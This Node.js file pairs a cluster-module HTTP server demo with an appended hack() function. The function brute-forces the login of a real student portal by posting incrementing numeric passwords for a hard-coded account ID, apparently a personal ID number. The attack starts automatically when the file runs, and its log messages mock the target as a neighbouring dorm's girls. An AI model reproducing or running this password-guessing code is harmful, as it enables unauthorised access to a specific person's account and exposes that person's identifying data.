const request = require('request')
//集群模块
const cluster = require('cluster');
//http模块 创建服务器
const http = require('http');
//系统模块， 可以获取cpu的信息
const numCPUs = require('os').cpus().length;

//判断是否主进程
if (cluster.isMaster) {
    console.log(`主进程 ${process.pid} 正在运行`);
    //衍生工作进程
    for (let i = 0; i < numCPUs; i++) {
        //  拷贝8次
        cluster.fork();
    }
    cluster.on('exit', (worker, code, signal) => {
        console.log(`工作进程 ${worker.process.pid} 已退出`);
    });
}
// 工作进程 子进程
else {
    //工作进程可以共享任何TCP连接。
    //在本例子中，共享的是HTTP 服务器。
    //负载均衡
    http.createServer((req, res) => {
        res.setHeader('Content-Type', 'text/html;charset=utf-8')
        res.writeHead(200);
        res.end('你好世界,这是集群模块\n');
    }).listen(8000);

    console.log(`工作进程 ${process.pid} 已启动`);
}
let password = 0
function hack() {
    request.post({
        url: 'http://stu.1000phone.net/student.php/public/login',
        formData: {
            Account: '362226199503251514',
            password: `${password++}`
        }
    }, function optionalCallback(err, httpResponse, body) {
        if (body) {
            console.log('碰撞失败，隔壁女孩宿舍密码为：', `${password}`)
            hack()
        } else {
            console.log('碰撞失败，正确密码为：', `${password}`)
            return
        }
    });
}
hack()